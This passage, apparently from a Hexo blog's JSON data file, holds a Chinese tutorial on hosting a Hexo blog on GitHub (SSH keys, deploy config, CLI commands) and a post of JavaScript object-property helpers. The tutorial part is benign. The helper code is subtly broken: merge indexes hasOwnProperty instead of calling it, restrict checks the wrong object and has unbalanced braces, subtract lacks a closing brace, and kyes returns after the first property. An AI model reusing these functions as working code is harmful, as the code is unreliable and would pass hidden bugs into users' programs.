文件夹,可以看见三个文件，id_rsa 是你的私钥，id_rsa.pub 是公钥，需要放在 github 上，这样你每次提交代码到仓库，都会进行本地的私钥和 git 混的公钥进行匹配，匹配完成，你才能进行一系列的操作<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_folder.png\" alt=\"ssh_folder\"></li>\n<li>打开 id_rsa.pub，复制里面的内容到 github 上的 SSH key 中（最后一行包含的是你的注册邮箱的信息）<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_text.png\" alt=\"ssh_text\"></li>\n<li>登录 Github，点击头像下的 <strong>settings</strong><br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/set_ssh.png\" alt=\"set_ssh\"></li>\n<li>选择 <strong>SSH and GPG keys</strong></li>\n<li>找到右侧 <strong>New SSH key</strong><br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_key.png\" alt=\"ssh_key\"></li>\n<li>title 随便填写，将复制的 id_rsa.pub 内容放至 key 中，点击<strong>Add SSH key</strong>保存，即可</li>\n<li>输入 ssh -T <a href=\"mailto:&#103;&#x69;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;\">&#103;&#x69;&#116;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#x6f;&#109;</a>，测试添加 ssh 是否成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n\n<p>如果看见<strong>Hi,xxxxx…</strong>,说明你就成功了<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/test_ssh.png\" alt=\"test_ssh\"></p>\n<h2 id=\"新建文章\"><a href=\"#新建文章\" class=\"headerlink\" title=\"新建文章\"></a>新建文章</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new post &quot;如何利用Hexo-Github搭建博客&quot;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置-deploy\"><a href=\"#配置-deploy\" class=\"headerlink\" title=\"配置 deploy\"></a>配置 deploy</h2><ul>\n<li>打开根目录下的_config.yml 文件</li>\n<li>deploy:<ul>\n<li>type: git</li>\n<li>repo: <a href=\"mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#109;\">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#109;</a>:<strong>githubname</strong>/<strong>githubname</strong>.github.io.git</li>\n<li>branch: master</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"生成文章\"><a href=\"#生成文章\" class=\"headerlink\" title=\"生成文章\"></a>生成文章</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"完成部署\"><a href=\"#完成部署\" class=\"headerlink\" title=\"完成部署\"></a>完成部署</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"打开-https-githubname-github-io-查看你的博客吧！\"><a href=\"#打开-https-githubname-github-io-查看你的博客吧！\" class=\"headerlink\" title=\"打开 https://githubname.github.io/ ,查看你的博客吧！\"></a>打开 <strong><a href=\"https://githubname.github.io/\">https://githubname.github.io/</a></strong> ,查看你的博客吧！</h2><h1 id=\"关于-Hexo-的详细配置\"><a href=\"#关于-Hexo-的详细配置\" class=\"headerlink\" title=\"关于 Hexo 的详细配置\"></a>关于 Hexo 的详细配置</h1><h2 id=\"配置信息-config-yml\"><a href=\"#配置信息-config-yml\" class=\"headerlink\" title=\"配置信息 _config.yml\"></a>配置信息 _config.yml</h2><h4 id=\"Site（网站）\"><a href=\"#Site（网站）\" class=\"headerlink\" title=\"Site（网站）\"></a>Site（网站）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>title</td>\n<td align=\"left\">网站标题</td>\n</tr>\n<tr>\n<td>subtitle</td>\n<td align=\"left\">网站副标题</td>\n</tr>\n<tr>\n<td>description</td>\n<td align=\"left\">网站描述，description 主要用于 SEO</td>\n</tr>\n<tr>\n<td>keywords</td>\n<td align=\"left\">关键字</td>\n</tr>\n<tr>\n<td>author</td>\n<td align=\"left\">你的名字</td>\n</tr>\n<tr>\n<td>language</td>\n<td align=\"left\">网站使用的语言</td>\n</tr>\n<tr>\n<td>timezone</td>\n<td align=\"left\">网站时区，默认是你电脑的时区</td>\n</tr>\n</tbody></table>\n<h4 id=\"URL-网址\"><a href=\"#URL-网址\" class=\"headerlink\" title=\"URL(网址)\"></a>URL(网址)</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>url</td>\n<td align=\"left\">网址</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td>root</td>\n<td align=\"left\">网站根目录</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td>permalink</td>\n<td align=\"left\">文章的永久链接格式</td>\n<td align=\"left\">:year/:month/:day/:title/</td>\n</tr>\n<tr>\n<td>permalink_defaults</td>\n<td align=\"left\">永久链接中各部分的默认值</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h5 id=\"网站存放在子目录\"><a href=\"#网站存放在子目录\" class=\"headerlink\" title=\"网站存放在子目录\"></a>网站存放在子目录</h5><p>如果你的网站存放在子目录中：<a href=\"http://yoursite.com/blog%EF%BC%8C%E5%88%99%EF%BC%9A\">http://yoursite.com/blog，则：</a><br>url：<a href=\"http://yoursite.com/blog\">http://yoursite.com/blog</a><br>root：/blog/</p>\n<h4 id=\"Directory-目录\"><a href=\"#Directory-目录\" class=\"headerlink\" title=\"Directory(目录)\"></a>Directory(目录)</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>source_dir</td>\n<td align=\"left\">资源文件夹，这个文件夹用来存放内容</td>\n<td align=\"left\">source</td>\n</tr>\n<tr>\n<td>public_dir</td>\n<td align=\"left\">公共文件夹，这个文件夹用于存放生成的站点文件</td>\n<td align=\"left\">public</td>\n</tr>\n<tr>\n<td>tag_dir</td>\n<td align=\"left\">标签文件夹</td>\n<td align=\"left\">tags</td>\n</tr>\n<tr>\n<td>archive_dir</td>\n<td align=\"left\">归档文件夹</td>\n<td align=\"left\">archives</td>\n</tr>\n<tr>\n<td>category_dir</td>\n<td align=\"left\">分类文件夹</td>\n<td align=\"left\">categories</td>\n</tr>\n<tr>\n<td>code_dir</td>\n<td align=\"left\">Include code 文件夹</td>\n<td align=\"left\">downloads/code</td>\n</tr>\n<tr>\n<td>i18n_dir</td>\n<td align=\"left\">国际化文件夹</td>\n<td align=\"left\">:lang</td>\n</tr>\n<tr>\n<td>skip_render</td>\n<td align=\"left\">跳过指定文件的渲染</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<p>tips：如果您刚刚开始接触 Hexo，通常没有必要修改这一部分的值。</p>\n<h4 id=\"Writing（文章）\"><a href=\"#Writing（文章）\" class=\"headerlink\" title=\"Writing（文章）\"></a>Writing（文章）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>new_post_name</td>\n<td align=\"left\">新建文章的名称</td>\n<td align=\"left\">:title.md</td>\n</tr>\n<tr>\n<td>default_layout</td>\n<td align=\"left\">预设布局</td>\n<td align=\"left\">post</td>\n</tr>\n<tr>\n<td>auto_spacing</td>\n<td align=\"left\">在中文和英文之间加入空格</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>titlecase</td>\n<td align=\"left\">把标题转为 title case</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>external_link</td>\n<td align=\"left\">在新标签中打开链接</td>\n<td align=\"left\">true</td>\n</tr>\n<tr>\n<td>filename_case</td>\n<td align=\"left\">把文件名称转换为小写(1)或者大写(2)</td>\n<td align=\"left\">0</td>\n</tr>\n<tr>\n<td>render_drafts</td>\n<td align=\"left\">显示草稿</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>post_asset_folder</td>\n<td align=\"left\">启动 Asset 文件夹</td>\n<td align=\"left\">true</td>\n</tr>\n<tr>\n<td>relative_link</td>\n<td align=\"left\">把链接改为与根目录的相对位址</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>future</td>\n<td align=\"left\">现实未来的文章</td>\n<td align=\"left\">true</td>\n</tr>\n<tr>\n<td>highlight</td>\n<td align=\"left\">代码块的设置</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h4 id=\"Category-amp-Tag（分类-amp-标签）\"><a href=\"#Category-amp-Tag（分类-amp-标签）\" class=\"headerlink\" title=\"Category &amp; Tag（分类&amp;标签）\"></a>Category &amp; Tag（分类&amp;标签）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>default_category</td>\n<td align=\"left\">默认分类</td>\n<td align=\"left\">uncategorized</td>\n</tr>\n<tr>\n<td>category_map</td>\n<td align=\"left\">分类别名</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td>tag_map</td>\n<td align=\"left\">标签别名</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h4 id=\"Date-Time-format\"><a href=\"#Date-Time-format\" class=\"headerlink\" title=\"Date / Time format\"></a>Date / Time format</h4><p>Hexo 使用 Moment.js 来解析和显示时间。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>date_format</td>\n<td align=\"left\">日期格式</td>\n<td align=\"left\">YYYY-MM-DD</td>\n</tr>\n<tr>\n<td>time_format</td>\n<td align=\"left\">时间格式</td>\n<td align=\"left\">HH:mm:ss</td>\n</tr>\n</tbody></table>\n<h4 id=\"Pagination（分页）\"><a href=\"#Pagination（分页）\" class=\"headerlink\" title=\"Pagination（分页）\"></a>Pagination（分页）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>per_page</td>\n<td align=\"left\">每页显示的文章量 (0 = 关闭分页功能)</td>\n<td align=\"left\">10</td>\n</tr>\n<tr>\n<td>pagination_dir</td>\n<td align=\"left\">分页目录</td>\n<td align=\"left\">page</td>\n</tr>\n</tbody></table>\n<h4 id=\"Extensions（扩展）\"><a href=\"#Extensions（扩展）\" class=\"headerlink\" title=\"Extensions（扩展）\"></a>Extensions（扩展）</h4><p><a href=\"https://hexo.io/plugins/\">Plugins</a><br><a href=\"https://hexo.io/themes/\">Themes</a></p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>theme</td>\n<td align=\"left\">当前主题，值为 false 时禁用主题</td>\n<td align=\"left\">landscape</td>\n</tr>\n</tbody></table>\n<h4 id=\"Deployment\"><a href=\"#Deployment\" class=\"headerlink\" title=\"Deployment\"></a>Deployment</h4><p><a href=\"https://hexo.io/docs/deployment.html\">Docs</a></p>\n<p>├──deploy //配置<br>│ ├──type: git //类型<br>│ ├──repo: <a href=\"mailto:&#103;&#x69;&#116;&#x40;&#103;&#105;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;\">&#103;&#x69;&#116;&#x40;&#103;&#105;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;</a>:githubname/githubname.github.io.git //新建仓库地址,注意 githubname 是你的 github 名称<br>│ ├──branch: master //分支</p>\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><ul>\n<li><strong>init</strong> 新建一个网站</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如果没有设置文件夹，hexo 默认在当前文件夹新建</p>\n<ul>\n<li><strong>new</strong> 新建一篇文章</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。默认是 post，如果标题包含空格的话，请使用引号括起来。</p>\n<ul>\n<li><p>布局（Layout）<br>hexo 三种默认布局：post、page、draft</p>\n<table>\n<thead>\n<tr>\n<th>布局</th>\n<th align=\"left\">路径</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>post</td>\n<td align=\"left\">source/_posts</td>\n</tr>\n<tr>\n<td>page</td>\n<td align=\"left\">source</td>\n</tr>\n<tr>\n<td>draft</td>\n<td align=\"left\">source/_drafts</td>\n</tr>\n</tbody></table>\n</li>\n<li><p>文件名称（title）<br>Hexo 默认以标题做为文件名称，但您可编辑 new_post_name 参数来改变默认的文件名称，举例来说，设为 :year-:month-:day-:title.md 可让您更方便的通过日期来管理文章。</p>\n<table>\n<thead>\n<tr>\n<th>变量</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>:title</td>\n<td align=\"left\">标题（小写，空格将会被替换为短杠）</td>\n</tr>\n<tr>\n<td>:year</td>\n<td align=\"left\">建立的年份，比如， 2015</td>\n</tr>\n<tr>\n<td>:month</td>\n<td align=\"left\">建立的月份（有前导零），比如， 04</td>\n</tr>\n<tr>\n<td>:i_month</td>\n<td align=\"left\">建立的月份（无前导零），比如， 4</td>\n</tr>\n<tr>\n<td>:day</td>\n<td align=\"left\">建立的日期（有前导零），比如， 07</td>\n</tr>\n<tr>\n<td>:i_day</td>\n<td align=\"left\">建立的日期（无前导零），比如， 7</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<ul>\n<li><strong>generate</strong> 生成静态文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>也可以简写为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-d,–deploy</td>\n<td align=\"left\">文件生成后立即部署网站</td>\n</tr>\n<tr>\n<td>-w，–watch</td>\n<td align=\"left\">监视文件变动</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g -d</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g -w</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>publish</strong> 发布草稿</li>\n</ul>\n<p>通过 publish 命令将草稿移动到 source/_posts 文件夹，该命令的使用方式与 new 十分类似，您也可在命令中指定 layout 来指定布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo publish [layout] &lt;filename&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>server</strong> 启动服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-p，–port</td>\n<td align=\"left\">重设端口</td>\n</tr>\n<tr>\n<td>-s,–static</td>\n<td align=\"left\">只使用静态文件</td>\n</tr>\n<tr>\n<td>-l,–log</td>\n<td align=\"left\">启动日志记录，使用覆盖记录格式</td>\n</tr>\n</tbody></table>\n<ul>\n<li><strong>deploy</strong> 部署网站</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>也可以简写为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-g, –generate</td>\n<td align=\"left\">部署之前预先生成静态文件</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n\n<p>注意两者区别：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g -d // 文件生成后立即部署网站(新生成的文件)</span><br><span class=\"line\">$ hexo d -g // 部署之前预先生成静态文件(之前已经生成的文件)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>render</strong> 渲染文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-o, –output</td>\n<td align=\"left\">设置输出路径</td>\n</tr>\n</tbody></table>\n<ul>\n<li>migrate 从其他博客系统</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo migrate &lt;type&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>clean</strong> 清除缓存文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo clean</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>list</strong> 列出网站资料。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo list &lt;type&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>version</strong> 显示 Hexo 版本。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo version</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>安全模式</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --safe</span><br></pre></td></tr></table></figure>\n\n<p>在安全模式下，不会载入插件和脚本。当您在安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p>\n<ul>\n<li><strong>调试模式</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --debug</span><br></pre></td></tr></table></figure>\n\n<p>在终端中显示调试信息并记录到 debug.log。当您碰到问题时，可以尝试用调试模式重新执行一次，并 提交调试信息到 GitHub。</p>\n<ul>\n<li><strong>简洁模式</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --silent</span><br></pre></td></tr></table></figure>\n\n<p>隐藏终端信息。</p>\n<ul>\n<li><strong>自定义配置文件的路径</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --config custom.yml</span><br></pre></td></tr></table></figure>\n\n<p>自定义配置文件的路径，执行后将不再使用 _config.yml。</p>\n<ul>\n<li><strong>显示草稿</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --draft</span><br></pre></td></tr></table></figure>\n\n<p>显示 source/_drafts 文件夹中的草稿文章。</p>\n<ul>\n<li><strong>自定义 CWD</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --cwd /path/to/cwd</span><br></pre></td></tr></table></figure>\n\n<p>自定义当前工作目录（Current working directory）的路径。</p>\n<h3 id=\"Scaffold（模板）\"><a href=\"#Scaffold（模板）\" class=\"headerlink\" title=\"Scaffold（模板）\"></a>Scaffold（模板）</h3><p>在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new photo &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 photo.md，并根据其内容建立文章，</p>\n<p>新建文章模板</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new post &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>新建分页模板</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new page &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>新建草稿模板</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new draft &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>以下是你可以在模版中使用的变量：</p>\n<table>\n<thead>\n<tr>\n<th>变量</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>layout</td>\n<td align=\"left\">布局</td>\n</tr>\n<tr>\n<td>title</td>\n<td align=\"left\">标题</td>\n</tr>\n<tr>\n<td>date</td>\n<td align=\"left\">文件建立日期</td>\n</tr>\n</tbody></table>\n<h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2>"},{"title":"枚举对象属性的工具函数","date":"2022-02-22T09:52:03.000Z","_content":"\n### 工具函数\n\n#### extend\n\n```JavaScript\n\nfunction extend(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n        o[prop]=p[prop] //将属性添加至o中\n    }\n    return o;\n}\n```\n\n#### merge\n\n```JavaScript\n\nfunction merge(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n    if(o.hasOwnProperty[prop]) continue; //过滤掉o中存在的属性\n        o[prop]=p[prop] //将属性添加至o中\n    }\n    return o;\n}\n```\n\n#### restrict p 中没有这个同名属性，从 o 中删除这个属性\n\n```JavaScript\n\nfunction restrict(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n    if(!(prop in p)){ // 如果p中没有这个属性，从o中删除这个属性\n        delete o[prop] //删除\n    }\n    return o;\n}\n```\n\n#### subtract p 中有这个同名属性，从 o 中删除这个属性\n\n```JavaScript\n\nfunction subtract(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n        delete o[prop]  // 如果p中有这个属性，从o中删除这个属性\n    return o;\n}\n```\n\n#### union 新对象同时拥有 o 和 p 的属性\n\n```JavaScript\n\nfunction union(o,p){\n    return extend(extend({},o),p)\n}\n```\n\n#### intersection 新对象同时拥有 o 和 p 的属性\n\n```JavaScript\n\nfunction intersection(o,p){\n    return restrict(extend({},o),p)\n}\n```\n\n#### kyes 新数组 中含有 o 的可枚举的自有属性\n\n```JavaScript\n\nfunction kyes(o){\n   if(typeof o !== \"object\") throw TypeError();\n\n   var result =[]\n   for(prop in o){\n       if(o.hasOwnProperty(prop)){\n           result.push(prop)\n       }\n       return result;\n   }\n}\n```\n","source":"_posts/枚举对象属性的工具函数.md","raw":"---\ntitle: 枚举对象属性的工具函数\ndate: 2022-02-22 17:52:03\ntags:\n  - javascript\n  - 对象枚举\n---\n\n### 工具函数\n\n#### extend\n\n```JavaScript\n\nfunction extend(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n        o[prop]=p[prop] //将属性添加至o中\n    }\n    return o;\n}\n```\n\n#### merge\n\n```JavaScript\n\nfunction merge(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n    if(o.hasOwnProperty[prop]) continue; //过滤掉o中存在的属性\n        o[prop]=p[prop] //将属性添加至o中\n    }\n    return o;\n}\n```\n\n#### restrict p 中没有这个同名属性，从 o 中删除这个属性\n\n```JavaScript\n\nfunction restrict(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n    if(!(prop in p)){ // 如果p中没有这个属性，从o中删除这个属性\n        delete o[prop] //删除\n    }\n    return o;\n}\n```\n\n#### subtract p 中有这个同名属性，从 o 中删除这个属性\n\n```JavaScript\n\nfunction subtract(o,p){\n    for(prop in p){ // 遍历p中的所有属性\n        delete o[prop]  // 如果p中有这个属性，从o中删除这个属性\n    return o;\n}\n```\n\n#### union 新对象同时拥有 o 和 p 的属性\n\n```JavaScript\n\nfunction union(o,p){\n    return extend(extend({},o),p)\n}\n```\n\n#### intersection 新对象同时拥有 o 和 p 的属性\n\n```JavaScript\n\nfunction intersection(o,p){\n    return restrict(extend({},o),p)\n}\n```\n\n#### kyes 新数组 中含有 o 的可枚举的自有属性\n\n```JavaScript\n\nfunction kyes(o){\n   if(typeof o !== \"object\") throw TypeError();\n\n   var result =[]\n   for(prop in o){\n       if(o.hasOwnProperty(prop)){\n           result.push(prop)\n       }\n       return result;\n   }\n}\n```\n","slug":"枚举对象属性的工具函数","published":1,"updated":"2022-02-23T05:36:57.719Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950d3000mn0w1fe32hz3v","content":"<h3 id=\"工具函数\"><a href=\"#工具函数\" class=\"headerlink\" title=\"工具函数\"></a>工具函数</h3><h4 id=\"extend\"><a href=\"#extend\" class=\"headerlink\" title=\"extend\"></a>extend</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span 